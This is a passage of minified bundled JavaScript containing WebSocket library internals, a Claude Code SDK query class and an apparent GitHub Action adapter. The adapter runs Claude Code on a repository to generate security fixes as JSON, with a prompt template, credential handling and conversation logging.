W1(P,g){P._readyState=y.CLOSING,P._errorEmitted=!0,P.emit("error",g),P.emitClose()}function F1(P){return P.path=P.socketPath,G.connect(P)}function f1(P){if(P.path=void 0,!P.servername&&P.servername!=="")P.servername=G.isIP(P.host)?"":P.host;return H.connect(P)}function b1(P,g,t){P._readyState=y.CLOSING;let U1=Error(t);if(Error.captureStackTrace(U1,b1),g.setHeader){if(g[_1]=!0,g.abort(),g.socket&&!g.socket.destroyed)g.socket.destroy();process.nextTick(W1,P,U1)}else g.destroy(U1),g.once("error",P.emit.bind(P,"error")),g.once("close",P.emitClose.bind(P))}function p1(P,g,t){if(g){let U1=O(g)?g.size:J1(g).length;if(P._socket)P._sender._bufferedBytes+=U1;else P._bufferedAmount+=U1}if(t){let U1=Error(`WebSocket is not open: readyState ${P.readyState} (${k1[P.readyState]})`);process.nextTick(t,U1)}}function X0(P,g){let t=this[L];if(t._closeFrameReceived=!0,t._closeMessage=g,t._closeCode=P,t._socket[L]===void 0)return;if(t._socket.removeListener("data",n),process.nextTick(L1,t._socket),P===1005)t.close();else t.close(P,g)}function m1(){let P=this[L];if(!P.isPaused)P._socket.resume()}function C1(P){let g=this[L];if(g._socket[L]!==void 0)g._socket.removeListener("data",n),process.nextTick(L1,g._socket),g.close(P[h]);if(!g._errorEmitted)g._errorEmitted=!0,g.emit("error",P)}function J0(){this[L].emitClose()}function o1(P,g){this[L].emit("message",P,g)}function v1(P){let g=this[L];if(g._autoPong)g.pong(P,!this._isServer,N);g.emit("ping",P)}function i(P){this[L].emit("pong",P)}function L1(P){P.resume()}function G0(P){let g=this[L];if(g.readyState===y.CLOSED)return;if(g.readyState===y.OPEN)g._readyState=y.CLOSING,U0(g);if(this._socket.end(),!g._errorEmitted)g._errorEmitted=!0,g.emit("error",P)}function U0(P){P._closeTimer=setTimeout(P._socket.destroy.bind(P._socket),q1)}function C0(){let P=this[L];this.removeListener("close",C0),this.removeListener("data",n),this.removeListener("end",d),P._readyState=y.CLOSING;let g;if(!this._readableState.endEmitted&&!P._closeFrameReceived&&!P._receiver._writableState.errorEmitted&&(g=P._socket.read())!==null)P._receiver.write(g);if(P._receiver.end(),this[L]=void 0,clearTimeout(P._closeTimer),P._receiver._writableState.finished||P._receiver._writableState.errorEmitted)P.emitClose();else P._receiver.on("error",J0),P._receiver.on("finish",J0)}function n(P){if(!this[L]._receiver.write(P))this.pause()}function d(){let P=this[L];P._readyState=y.CLOSING,P._receiver.end(),this.end()}function z1(){let P=this[L];if(this.removeListener("error",z1),this.on("error",N),P)P._readyState=y.CLOSING,this.destroy()}}),xx1=R9((X,J)=>{var Q=vG(),{Duplex:Y}=v0("stream");function W($){$.emit("close")}function G(){if(!this.destroyed&&this._writableState.finished)this.destroy()}function H($){if(this.removeListener("error",H),this.destroy(),this.listenerCount("error")===0)this.emit("error",$)}function z($,V){let K=!0,Z=new Y({...V,autoDestroy:!1,emitClose:!1,objectMode:!1,writableObjectMode:!1});return $.on("message",function(B,M){let O=!M&&Z._readableState.objectMode?B.toString():B;if(!Z.push(O))$.pause()}),$.once("error",function(B){if(Z.destroyed)return;K=!1,Z.destroy(B)}),$.once("close",function(){if(Z.destroyed)return;Z.push(null)}),Z._destroy=function(q,B){if($.readyState===$.CLOSED){B(q),process.nextTick(W,Z);return}let M=!1;if($.once("error",function(R){M=!0,B(R)}),$.once("close",function(){if(!M)B(q);process.nextTick(W,Z)}),K)$.terminate()},Z._final=function(q){if($.readyState===$.CONNECTING){$.once("open",function(){Z._final(q)});return}if($._socket===null)return;if($._socket._writableState.finished){if(q(),Z._readableState.endEmitted)Z.destroy()}else $._socket.once("finish",function(){q()}),$.close()},Z._read=function(){if($.isPaused)$.resume()},Z._write=function(q,B,M){if($.readyState===$.CONNECTING){$.once("open",function(){Z._write(q,B,M)});return}$.send(q,M)},Z.on("end",G),Z.on("error",H),Z}J.exports=z}),hx1=R9((X,J)=>{var{tokenChars:Q}=Q5();function Y(W){let G=new Set,H=-1,z=-1,$=0;for($;$<W.length;$++){let K=W.charCodeAt($);if(z===-1&&Q[K]===1){if(H===-1)H=$}else if($!==0&&(K===32||K===9)){if(z===-1&&H!==-1)z=$}else if(K===44){if(H===-1)throw SyntaxError(`Unexpected character at index ${$}`);if(z===-1)z=$;let Z=W.slice(H,z);if(G.has(Z))throw SyntaxError(`The "${Z}" subprotocol is duplicated`);G.add(Z),H=z=-1}else throw SyntaxError(`Unexpected character at index ${$}`)}if(H===-1||z!==-1)throw SyntaxError("Unexpected end of input");let V=W.slice(H,$);if(G.has(V))throw SyntaxError(`The "${V}" subprotocol is duplicated`);return G.add(V),G}J.exports={parse:Y}}),yx1=R9((X,J)=>{var Q=v0("events"),Y=v0("http"),{Duplex:W}=v0("stream"),{createHash:G}=v0("crypto"),H=jD(),z=IQ(),$=hx1(),V=vG(),{GUID:K,kWebSocket:Z}=FX(),q=/^[+/0-9A-Za-z]{22}==$/,B=0,M=1,O=2;class R extends Q{constructor(L,N){super();if(L={allowSynchronousEvents:!0,autoPong:!0,maxPayload:104857600,skipUTF8Validation:!1,perMessageDeflate:!1,handleProtocols:null,clientTracking:!0,verifyClient:null,noServer:!1,backlog:null,server:null,host:null,path:null,port:null,WebSocket:V,...L},L.port==null&&!L.server&&!L.noServer||L.port!=null&&(L.server||L.noServer)||L.server&&L.noServer)throw TypeError('One and only one of the "port", "server", or "noServer" options must be specified');if(L.port!=null)this._server=Y.createServer((k,_)=>{let c=Y.STATUS_CODES[426];_.writeHead(426,{"Content-Length":c.length,"Content-Type":"text/plain"}),_.end(c)}),this._server.listen(L.port,L.host,L.backlog,N);else if(L.server)this._server=L.server;if(this._server){let k=this.emit.bind(this,"connection");this._removeListeners=I(this._server,{listening:this.emit.bind(this,"listening"),error:this.emit.bind(this,"error"),upgrade:(_,c,a)=>{this.handleUpgrade(_,c,a,k)}})}if(L.perMessageDeflate===!0)L.perMessageDeflate={};if(L.clientTracking)this.clients=new Set,this._shouldEmitClose=!1;this.options=L,this._state=B}address(){if(this.options.noServer)throw Error('The server is operating in "noServer" mode');if(!this._server)return null;return this._server.address()}close(L){if(this._state===O){if(L)this.once("close",()=>{L(Error("The server is not running"))});process.nextTick(F,this);return}if(L)this.once("close",L);if(this._state===M)return;if(this._state=M,this.options.noServer||this.options.server){if(this._server)this._removeListeners(),this._removeListeners=this._server=null;if(this.clients)if(!this.clients.size)process.nextTick(F,this);else this._shouldEmitClose=!0;else process.nextTick(F,this)}else{let N=this._server;this._removeListeners(),this._removeListeners=this._server=null,N.close(()=>{F(this)})}}shouldHandle(L){if(this.options.path){let N=L.url.indexOf("?");if((N!==-1?L.url.slice(0,N):L.url)!==this.options.path)return!1}return!0}handleUpgrade(L,N,k,_){N.on("error",T);let c=L.headers["sec-websocket-key"],a=L.headers.upgrade,J1=+L.headers["sec-websocket-version"];if(L.method!=="GET"){h(this,L,N,405,"Invalid HTTP method");return}if(a===void 0||a.toLowerCase()!=="websocket"){h(this,L,N,400,"Invalid Upgrade header");return}if(c===void 0||!q.test(c)){h(this,L,N,400,"Missing or invalid Sec-WebSocket-Key header");return}if(J1!==13&&J1!==8){h(this,L,N,400,"Missing or invalid Sec-WebSocket-Version header",{"Sec-WebSocket-Version":"13, 8"});return}if(!this.shouldHandle(L)){b(N,400);return}let q1=L.headers["sec-websocket-protocol"],_1=new Set;if(q1!==void 0)try{_1=$.parse(q1)}catch(r){h(this,L,N,400,"Invalid Sec-WebSocket-Protocol header");return}let M1=L.headers["sec-websocket-extensions"],k1={};if(this.options.perMessageDeflate&&M1!==void 0){let r=new z(this.options.perMessageDeflate,!0,this.options.maxPayload);try{let y=H.parse(M1);if(y[z.extensionName])r.accept(y[z.extensionName]),k1[z.extensionName]=r}catch(y){h(this,L,N,400,"Invalid or unacceptable Sec-WebSocket-Extensions header");return}}if(this.options.verifyClient){let r={origin:L.headers[`${J1===8?"sec-websocket-origin":"origin"}`],secure:!!(L.socket.authorized||L.socket.encrypted),req:L};if(this.options.verifyClient.length===2){this.options.verifyClient(r,(y,m,W1,F1)=>{if(!y)return b(N,m||401,W1,F1);this.completeUpgrade(k1,c,_1,L,N,k,_)});return}if(!this.options.verifyClient(r))return b(N,401)}this.completeUpgrade(k1,c,_1,L,N,k,_)}completeUpgrade(L,N,k,_,c,a,J1){if(!c.readable||!c.writable)return c.destroy();if(c[Z])throw Error("server.handleUpgrade() was called more than once with the same socket, possibly due to a misconfiguration");if(this._state>B)return b(c,503);let _1=["HTTP/1.1 101 Switching Protocols","Upgrade: websocket","Connection: Upgrade",`Sec-WebSocket-Accept: ${G("sha1").update(N+K).digest("base64")}`],M1=new this.options.WebSocket(null,void 0,this.options);if(k.size){let k1=this.options.handleProtocols?this.options.handleProtocols(k,_):k.values().next().value;if(k1)_1.push(`Sec-WebSocket-Protocol: ${k1}`),M1._protocol=k1}if(L[z.extensionName]){let k1=L[z.extensionName].params,r=H.format({[z.extensionName]:[k1]});_1.push(`Sec-WebSocket-Extensions: ${r}`),M1._extensions=L}if(this.emit("headers",_1,_),c.write(_1.concat(`\r
`).join(`\r
`)),c.removeListener("error",T),M1.setSocket(c,a,{allowSynchronousEvents:this.options.allowSynchronousEvents,maxPayload:this.options.maxPayload,skipUTF8Validation:this.options.skipUTF8Validation}),this.clients)this.clients.add(M1),M1.on("close",()=>{if(this.clients.delete(M1),this._shouldEmitClose&&!this.clients.size)process.nextTick(F,this)});J1(M1,_)}}J.exports=R;function I(L,N){for(let k of Object.keys(N))L.on(k,N[k]);return function(){for(let _ of Object.keys(N))L.removeListener(_,N[_])}}function F(L){L._state=O,L.emit("close")}function T(){this.destroy()}function b(L,N,k,_){k=k||Y.STATUS_CODES[N],_={Connection:"close","Content-Type":"text/html","Content-Length":Buffer.byteLength(k),..._},L.once("finish",L.destroy),L.end(`HTTP/1.1 ${N} ${Y.STATUS_CODES[N]}\r
`+Object.keys(_).map((c)=>`${c}: ${_[c]}`).join(`\r
`)+`\r
\r
`+k)}function h(L,N,k,_,c,a){if(L.listenerCount("wsClientError")){let J1=Error(c);Error.captureStackTrace(J1,h),L.emit("wsClientError",J1,k,N)}else b(k,_,c,a)}});ix1={accessSync(X,J){E1.accessSync(X,J)},cwd(){return process.cwd()},chmodSync(X,J){E1.chmodSync(X,J)},existsSync(X){return E1.existsSync(X)},async stat(X){return dx1(X)},statSync(X){return E1.statSync(X)},readFileSync(X,J){return E1.readFileSync(X,{encoding:J.encoding})},readFileBytesSync(X){return E1.readFileSync(X)},readSync(X,J){let Q=void 0;try{Q=E1.openSync(X,"r");let Y=Buffer.alloc(J.length),W=E1.readSync(Q,Y,0,J.length,0);return{buffer:Y,bytesRead:W}}finally{if(Q)E1.closeSync(Q)}},writeFileSync(X,J,Q){if(!Q.flush){E1.writeFileSync(X,J,{encoding:Q.encoding});return}let Y;try{Y=E1.openSync(X,"w"),E1.writeFileSync(Y,J,{encoding:Q.encoding}),E1.fsyncSync(Y)}finally{if(Y)E1.closeSync(Y)}},appendFileSync(X,J){E1.appendFileSync(X,J)},copyFileSync(X,J){E1.copyFileSync(X,J)},unlinkSync(X){E1.unlinkSync(X)},renameSync(X,J){E1.renameSync(X,J)},symlinkSync(X,J){E1.symlinkSync(X,J)},readlinkSync(X){return E1.readlinkSync(X)},realpathSync(X){return E1.realpathSync(X)},mkdirSync(X){if(!E1.existsSync(X))E1.mkdirSync(X,{recursive:!0})},readdirSync(X){return E1.readdirSync(X,{withFileTypes:!0})},readdirStringSync(X){return E1.readdirSync(X)},isDirEmptySync(X){return this.readdirSync(X).length===0},rmdirSync(X){E1.rmdirSync(X)},rmSync(X,J){E1.rmSync(X,J)}},rx1=ix1;l6=class l6 extends Error{};W60=J5(xx1(),1),G60=J5(BD(),1),H60=J5(MD(),1),nx1=J5(vG(),1),z60=J5(yx1(),1),NQ=nx1.default;RD=class RD{returned;queue=[];readResolve;readReject;isDone=!1;hasError;started=!1;constructor(X){this.returned=X}[Symbol.asyncIterator](){if(this.started)throw Error("Stream can only be iterated once");return this.started=!0,this}next(){if(this.queue.length>0)return Promise.resolve({done:!1,value:this.queue.shift()});if(this.isDone)return Promise.resolve({done:!0,value:void 0});if(this.hasError)return Promise.reject(this.hasError);return new Promise((X,J)=>{this.readResolve=X,this.readReject=J})}enqueue(X){if(this.readResolve){let J=this.readResolve;this.readResolve=void 0,this.readReject=void 0,J({done:!1,value:X})}else this.queue.push(X)}done(){if(this.isDone=!0,this.readResolve){let X=this.readResolve;this.readResolve=void 0,this.readReject=void 0,X({done:!0,value:void 0})}}error(X){if(this.hasError=X,this.readReject){let J=this.readReject;this.readResolve=void 0,this.readReject=void 0,J(X)}}return(){if(this.isDone=!0,this.returned)this.returned();return Promise.resolve({done:!0,value:void 0})}};xG=class xG{transport;isStreamingMode;canUseTool;hooks;abortController;pendingControlResponses=new Map;cleanupPerformed=!1;sdkMessages;inputStream=new RD;intialization;cancelControllers=new Map;hookCallbacks=new Map;nextCallbackId=0;constructor(X,J,Q,Y,W){if(this.transport=X,this.isStreamingMode=J,this.canUseTool=Q,this.hooks=Y,this.abortController=W,this.sdkMessages=this.readSdkMessages(),this.readMessages(),this.isStreamingMode)this.intialization=this.initialize()}setError(X){this.inputStream.error(X)}cleanup(X){if(this.cleanupPerformed)return;this.cleanupPerformed=!0;try{if(this.transport.close(),this.pendingControlResponses.clear(),X)this.inputStream.error(X);else this.inputStream.done()}catch(J){}}next(...[X]){return this.sdkMessages.next(...[X])}return(X){return this.sdkMessages.return(X)}throw(X){return this.sdkMessages.throw(X)}[Symbol.asyncIterator](){return this.sdkMessages}[Symbol.asyncDispose](){return this.sdkMessages[Symbol.asyncDispose]()}async readMessages(){try{for await(let X of this.transport.readMessages()){if(X.type==="control_response"){let J=this.pendingControlResponses.get(X.response.request_id);if(J)J(X.response);continue}else if(X.type==="control_request"){this.handleControlRequest(X);continue}else if(X.type==="control_cancel_request"){this.handleControlCancelRequest(X);continue}this.inputStream.enqueue(X)}this.inputStream.done(),this.cleanup()}catch(X){this.inputStream.error(X),this.cleanup(X)}}async handleControlRequest(X){let J=new AbortController;this.cancelControllers.set(X.request_id,J);try{let Q=await this.processControlRequest(X,J.signal),Y={type:"control_response",response:{subtype:"success",request_id:X.request_id,response:Q}};await Promise.resolve(this.transport.write(JSON.stringify(Y)+`
`))}catch(Q){let Y={type:"control_response",response:{subtype:"error",request_id:X.request_id,error:Q.message||String(Q)}};await Promise.resolve(this.transport.write(JSON.stringify(Y)+`
`))}finally{this.cancelControllers.delete(X.request_id)}}handleControlCancelRequest(X){let J=this.cancelControllers.get(X.request_id);if(J)J.abort(),this.cancelControllers.delete(X.request_id)}async processControlRequest(X,J){if(X.request.subtype==="can_use_tool"){if(!this.canUseTool)throw Error("canUseTool callback is not provided.");return this.canUseTool(X.request.tool_name,X.request.input,{signal:J})}else if(X.request.subtype==="hook_callback")return await this.handleHookCallbacks(X.request.callback_id,X.request.input,X.request.tool_use_id,J);throw Error("Unsupported control request subtype: "+X.request.subtype)}async*readSdkMessages(){for await(let X of this.inputStream)yield X}async initialize(){let X;if(this.hooks){X={};for(let[Y,W]of Object.entries(this.hooks))if(W.length>0)X[Y]=W.map((G)=>{let H=[];for(let z of G.hooks){let $=`hook_${this.nextCallbackId++}`;this.hookCallbacks.set($,z),H.push($)}return{matcher:G.matcher,hookCallbackIds:H}})}let J={subtype:"initialize",hooks:X};return(await this.request(J)).response}async interrupt(){if(!this.isStreamingMode)throw Error("Interrupt requires --input-format stream-json");await this.request({subtype:"interrupt"})}async setPermissionMode(X){if(!this.isStreamingMode)throw Error("setPermissionMode requires --input-format stream-json");await this.request({subtype:"set_permission_mode",mode:X})}request(X){let J=Math.random().toString(36).substring(2,15),Q={request_id:J,type:"control_request",request:X};return new Promise((Y,W)=>{this.pendingControlResponses.set(J,(G)=>{if(G.subtype==="success")Y(G);else W(Error(G.error))}),Promise.resolve(this.transport.write(JSON.stringify(Q)+`
`))})}async supportedCommands(){if(!this.isStreamingMode)throw Error("supportedCommands requires --input-format stream-json");if(!this.intialization)throw Error("supportedCommands requires transport with bidirectional communication");return(await this.intialization).commands}async streamInput(X){try{for await(let J of X){if(this.abortController?.signal.aborted)break;await Promise.resolve(this.transport.write(JSON.stringify(J)+`
`))}this.transport.endInput()}catch(J){if(!(J instanceof l6))throw J}}handleHookCallbacks(X,J,Q,Y){let W=this.hookCallbacks.get(X);if(!W)throw Error(`No hook callback found for ID: ${X}`);return W(J,Q,{signal:Y})}}});import Q8 from"path";import O6 from"fs";class Y8{repoPath;config;claudeConfig;tempDir;usageData=[];credentialManager;conversationLogger;constructor(X,J=process.cwd(),Q){if(this.config=X,this.repoPath=J,this.credentialManager=Q,this.claudeConfig=X.claudeCodeConfig||{},this.tempDir=this.claudeConfig.tempDir||Q8.join(process.cwd(),"temp"),this.conversationLogger=c6.getInstance(),this.conversationLogger.initialize().catch((Y)=>{U.warn("Failed to initialize conversation logger:",Y)}),!O6.existsSync(this.tempDir))try{O6.mkdirSync(this.tempDir,{recursive:!0})}catch(Y){U.warn(`Failed to create temp directory: ${Y}`)}if(this.claudeConfig.verboseLogging)U.info("Claude Code SDK adapter initialized with config:",JSON.stringify({tempDir:this.tempDir,contextOptions:this.claudeConfig.contextOptions,retryOptions:this.claudeConfig.retryOptions,timeout:this.claudeConfig.timeout},null,2))}async isAvailable(){try{let{query:X}=await Promise.resolve().then(() => (yG(),hG));this.claudeConfig.executablePath;let J=[this.claudeConfig.executablePath,Q8.join(__dirname,"..","..","..","node_modules","@anthropic-ai","claude-code","cli.js"),Q8.join(process.cwd(),"node_modules","@anthropic-ai","claude-code","cli.js"),"/home/dylan/dev/rsolv/RSOLV-action/node_modules/@anthropic-ai/claude-code/cli.js"].filter(Boolean),Y=J.find((G)=>G&&O6.existsSync(G))||(J.length>0&&J[0]?J[0]:"/dev/null");if(!O6.existsSync(Y))return U.warn(`Claude Code executable not found at: ${Y}`),!1;return!0}catch(X){return U.error("Claude Code SDK not available",X),!1}}async generateSolution(X,J,Q){let W=this.claudeConfig.retryOptions?.maxRetries??2,G=this.claudeConfig.timeout??1800000,H={startTime:Date.now(),issueId:X.id,successful:!1};try{if(U.info(`Generating solution using Claude Code SDK for issue: ${X.id}`),!await this.isAvailable())return U.warn("Claude Code CLI not available"),H.errorType="cli_not_available",this.trackUsage(H),{success:!1,message:"Claude Code CLI not available",error:`Claude Code CLI not available. Please ensure @anthropic-ai/claude-code is installed and the executable path is correct.

Installation instructions:
1. Install Claude Code: npm install -g @anthropic-ai/claude-code
2. Verify installation: claude -v
3. Visit https://claude.ai/console/claude-code for more information`};let $=this.constructPrompt(X,J,Q),V=this.config.apiKey;if(this.config.useVendedCredentials&&this.credentialManager)try{V=this.credentialManager.getCredential("anthropic"),U.info("Using vended Anthropic credential for Claude Code SDK")}catch(I){U.warn("Failed to get vended credential, falling back to config API key",I)}process.env.ANTHROPIC_API_KEY=V;let K=new AbortController,Z=setTimeout(()=>{K.abort()},G),q=[],B=null,M=!0,O=0,R=Date.now();try{if(this.claudeConfig.verboseLogging)U.info(`Starting Claude Code exploration for issue: ${X.title}`);await this.conversationLogger.logSummary(X.id,`Starting Claude Code conversation for issue: ${X.title}`);let I=Q8.join(this.repoPath,"mcp-config.json"),F=O6.existsSync(I),T={abortController:K,cwd:this.repoPath,maxTurns:30,pathToClaudeCodeExecutable:(()=>{let N=[this.claudeConfig.executablePath,Q8.join(__dirname,"..","..","..","node_modules","@anthropic-ai","claude-code","cli.js"),Q8.join(process.cwd(),"node_modules","@anthropic-ai","claude-code","cli.js"),"/home/dylan/dev/rsolv/RSOLV-action/node_modules/@anthropic-ai/claude-code/cli.js"].filter(Boolean);return N.find((_)=>_&&O6.existsSync(_))||(N.length>0&&N[0]?N[0]:"/dev/null")})()};if(this.claudeConfig?.useStructuredPhases)T.mcpConfig=null,U.info("Disabled MCP for structured phases - using core Edit/MultiEdit tools only");else if(F)T.mcpConfig=I,U.info("Using MCP configuration from mcp-config.json, including sequential thinking");let{query:h}=await Promise.resolve().then(() => (yG(),hG));for await(let N of h({prompt:$,options:T})){if(q.push(N),O++,this.claudeConfig.verboseLogging&&N.type==="assistant"){let k=N;if(k.message?.content){for(let _ of k.message.content)if(_.type==="tool_use")U.debug(`Claude exploring: ${_.name} tool`),M=!0;else if(_.type==="text"&&_.text){if(_.text.includes("```json")||_.text.includes("ultimate solution")||_.text.includes("Final Output"))M=!1,U.info("Claude transitioning to solution generation phase")}}}if(N.type==="assistant"&&N.text){let k=this.extractSolutionFromText(N.text);if(k){if(B=k,this.claudeConfig.verboseLogging)U.info("Found solution in text message")}}if(N.type==="assistant"){let k=N;if(k.message?.content){for(let _ of k.message.content)if(_.type==="text"&&_.text){let c=this.extractSolutionFromText(_.text);if(c){if(B=c,this.claudeConfig.verboseLogging)U.info("Found solution in assistant message")}}}}if(N.type==="result"||N.type==="final_result"){let k=N;if(this.claudeConfig.verboseLogging)U.info(`Received ${N.type} message from Claude Code SDK`);if(k.text){let _=this.extractSolutionFromText(k.text);if(_)B=_,U.info("Found solution in result message")}else if(k.content){let _=this.extractSolutionFromText(typeof k.content==="string"?k.content:JSON.stringify(k.content));if(_)B=_,U.info("Found solution in result message content")}}}clearTimeout(Z),H.endTime=Date.now(),H.solutionGenerationTime=H.endTime-H.startTime;let L={issueId:X.id,timestamp:new Date().toISOString(),provider:"anthropic",model:"claude-code",messages:q.map((N)=>({type:N.type,content:N,timestamp:new Date().toISOString()})),metadata:{workflowRun:process.env.GITHUB_RUN_ID,workflowJob:process.env.GITHUB_JOB,repository:process.env.GITHUB_REPOSITORY,issueNumber:parseInt(X.id.split("#")[1]||"0"),duration:Date.now()-R,tokenUsage:{prompt:0,completion:0,total:0}},result:{success:!!B,solutionGenerated:!!B}};if(await this.conversationLogger.logConversation(L),B){if(H.successful=!0,this.trackUsage(H),this.claudeConfig.verboseLogging)U.info(`Claude Code completed exploration with ${O} messages`),U.info(`Solution found with ${B.files.length} file(s) to change`);await this.conversationLogger.logSummary(X.id,`Claude Code conversation completed successfully with ${O} messages and ${B.files.length} files changed`);let N={};return B.files.forEach((k)=>{N[k.path]=k.changes}),{success:!0,message:`Solution generated with Claude Code SDK after ${O} exploration steps`,changes:N,messages:q}}else{if(U.warn(`No solution found in Claude Code SDK response after ${O} messages`),H.errorType="no_solution_found",this.trackUsage(H),await this.conversationLogger.logSummary(X.id,`Claude Code conversation completed without solution after ${O} messages`),q.length>0){let N=q.slice(-5);U.warn("Last 5 messages from Claude Code SDK:"),N.forEach((_,c)=>{let a={index:q.length-5+c,type:_.type,hasText:!!_.text,hasContent:!!_.content,hasMessage:!!_.message};if(_.text)a.textPreview=_.text.slice(0,200);if(_.content){if(a.contentType=typeof _.content,typeof _.content==="string")a.contentPreview=_.content.slice(0,200)}if(_.message?.content)a.messageContent=Array.isArray(_.message.content)?_.message.content.map((J1)=>({type:J1.type,hasText:!!J1.text})):"not an array";U.warn(`Message ${a.index}:`,a)});let k=q.find((_)=>_.type==="result"||_.type==="final_result");if(k)U.warn("Found result message but could not extract solution:",{type:k.type,hasText:!!k.text,hasContent:!!k.content,keys:Object.keys(k)});else U.warn("No result/final_result message found in conversation")}return{success:!1,message:"No solution found in response",error:`Claude Code explored the repository (${O} steps) but did not generate a valid JSON solution. This might indicate the issue requires more context or manual intervention.`,messages:q}}}catch(I){let F=I.message||String(I),T=I.name==="AbortError"||F.includes("AbortError")?"timeout":"query_error",b={issueId:X.id,timestamp:new Date().toISOString(),provider:"anthropic",model:"claude-code",messages:q.map((h)=>({type:h.type,content:h,timestamp:new Date().toISOString()})),metadata:{workflowRun:process.env.GITHUB_RUN_ID,workflowJob:process.env.GITHUB_JOB,repository:process.env.GITHUB_REPOSITORY,issueNumber:parseInt(X.id.split("#")[1]||"0"),duration:Date.now()-R},result:{success:!1,error:F}};if(await this.conversationLogger.logConversation(b),await this.conversationLogger.logSummary(X.id,`Claude Code conversation failed: ${T} - ${F}`),T==="timeout")return U.error(`Claude Code SDK execution timed out after ${G/1000} seconds`),H.errorType="timeout",H.endTime=Date.now(),this.trackUsage(H),{success:!1,message:"Claude Code SDK execution failed",error:`Claude Code SDK execution timed out after ${G/1000} seconds`};else return U.error("Claude Code SDK query failed",I),H.errorType="query_error",H.endTime=Date.now(),this.trackUsage(H),{success:!1,message:"Claude Code SDK execution failed",error:`Claude Code SDK execution failed: ${F}`}}finally{clearTimeout(Z)}}catch(z){return U.error("Unexpected error generating solution with Claude Code SDK",z),H.errorType="unexpected_error",H.endTime=Date.now(),this.trackUsage(H),{success:!1,message:"Unexpected error using Claude Code SDK",error:z instanceof Error?z.message:String(z)}}}trackUsage(X){if(this.claudeConfig.trackUsage!==!1){this.usageData.push(X);let J=Q8.join(this.tempDir,"claude-code-analytics.json");try{if(this.claudeConfig.verboseLogging)U.debug(`Saving analytics to: ${J}`);let Q=[];if(O6.existsSync(J))Q=JSON.parse(O6.readFileSync(J,"utf-8"));if(Q.push(X),Q.length>100)Q=Q.slice(-100);if(O6.writeFileSync(J,JSON.stringify(Q,null,2)),this.claudeConfig.verboseLogging)U.debug(`Analytics saved successfully with ${Q.length} entries`)}catch(Q){U.warn("Error saving analytics data",Q)}if(this.claudeConfig.verboseLogging){let Q=X.endTime?(X.endTime-X.startTime)/1000:0;U.info(`Usage stats for issue ${X.issueId}: ${X.successful?"Success":"Failed"} in ${Q.toFixed(1)}s`)}}}constructPrompt(X,J,Q){if(Q)return Q;return`You are an expert developer tasked with fixing an issue in a codebase. I need you to explore the repository, understand the problem deeply, and create a comprehensive solution.

## Issue Details:
- **Title**: ${X.title}
- **Description**: ${X.body}
- **Complexity**: ${J.complexity}
- **Estimated Time**: ${J.estimatedTime} minutes
- **Initial Related Files**: ${J.relatedFiles?.join(", ")||"To be discovered through exploration"}

## Your Task:

### Phase 1: Repository Exploration
First, explore the repository structure to understand:
- The overall architecture and file organization
- Where the vulnerability or issue might be located
- Related components that might be affected
- Existing patterns and coding standards

Use tools like Grep, Glob, and Read to explore the codebase thoroughly.

### Phase 2: Deep Analysis
Once you understand the codebase:
- Locate the exact source of the issue
- Understand how the vulnerable code works
- Identify all files that need changes
- Consider security implications and edge cases

### Phase 3: Solution Development
Develop your solution iteratively:
- Start with the core fix
- Add necessary validation and error handling
- Ensure the fix follows existing code patterns
- Consider adding tests if appropriate

### Phase 4: Final Output
After you've completed your exploration and solution development, provide your ultimate solution as a JSON object with this EXACT structure:

\`\`\`json
{
  "title": "Brief title for the PR (e.g., 'Fix XSS vulnerability in login form')",
  "description": "Detailed description explaining what was vulnerable, why it was dangerous, and how your fix addresses it",
  "files": [
    {
      "path": "exact/path/to/file.js",
      "changes": "The COMPLETE new content for the file (not a diff, but the full file content after changes)"
    }
  ],
  "tests": [
    "Description of test case 1 to verify the fix",
    "Description of test case 2 for edge cases"
  ]
}
\`\`\`

Remember: Take your time to explore and understand the codebase thoroughly before implementing the solution. The final JSON must be properly formatted and include the complete file contents after your changes.`}extractSolutionFromText(X){try{let J=X.match(/```(?:json)?\s*([\s\S]*?)\s*```/);if(J){let Y=JSON.parse(J[1]);if(Y.title&&Y.description&&Array.isArray(Y.files))return U.debug("Successfully extracted solution from JSON code block"),{title:Y.title,description:Y.description,files:Y.files,tests:Y.tests||[]}}let Q=JSON.parse(X);if(Q.title&&Q.description&&Array.isArray(Q.files))return U.debug("Successfully parsed solution directly from text"),{title:Q.title,description:Q.description,files:Q.files,tests:Q.tests||[]}}catch(J){U.debug("Could not extract JSON solution from text")}return null}getUsageData(){return this.usageData}getAnalyticsSummary(){let X=this.usageData.length;if(X===0)return{total:0};let J=this.usageData.filter((H)=>H.successful).length,Q=J/X*100,Y=this.usageData.filter((H)=>H.endTime!==void 0).map((H)=>(H.endTime-H.startTime)/1000).reduce((H,z)=>H+z,0)/X,W=this.usageData.filter((H)=>H.cost!==void 0).map((H)=>H.cost).reduce((H,z)=>H+z,0),G=this.usageData.filter((H)=>H.errorType).reduce((H,z)=>{let $=z.errorType;return H[$]=(H[$]||0)+1,H},{});return{total:X,successful:J,successRate:Q.toFixed(1)+"%",avgDuration:Y.toFixed(1)+"s",totalCost:"$"+W.toFixed(4),errorTypes:G}}}var __dirname="/home/dylan/dev/rsolv/RSOLV-action/src/ai/adapters";var CQ=s(()=>{I1();VD()});async function gG(X,J,Q,Y,W,G){try{if(U.info(`Generating solution for issue #${X.number}`),Q.aiProvider.provider==="claude-code"&&!Y){U.info("Using Claude Code for solution generation");let M;if(Q.aiProvider.useVendedCredentials&&Q.rsolvApiKey){process.env.RSOLV_API_KEY=Q.rsolvApiKey,U.info("Set RSOLV_API_KEY environment variable for vended credentials");let{CredentialManagerSingleton:T}=await Promise.resolve().then(() => (sX(),YJ));M=await T.getInstance(Q.rsolvApiKey)}let O={provider:Q.aiProvider.provider,apiKey:Q.aiProvider.providerApiKey,model:Q.aiProvider.model,temperature:Q.aiProvider.temperature,maxTokens:Q.aiProvider.maxTokens,useVendedCredentials:Q.aiProvider.useVendedCredentials,claudeCodeConfig:{}},R=new Y8(O,process.cwd(),M),I={summary:`${J.issueType} issue requiring fixes`,complexity:J.estimatedComplexity==="simple"?"low":J.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[J.suggestedApproach],recommendedApproach:J.suggestedApproach,relatedFiles:J.filesToModify},F=await R.generateSolution(X,I);if(F.success)return{success:!0,message:"Solution generated with Claude Code",changes:F.changes};if(F.error&&F.error.includes("Claude Code CLI not available"))U.info("Claude Code not available, falling back to standard AI provider API");else return{success:!1,message:F.message,error:F.error}}let H=Q.aiProvider.provider==="claude-code"?{...Q.aiProvider,provider:"anthropic",model:"claude-3-5-sonnet-20241022"}:Q.aiProvider,z=Y||await 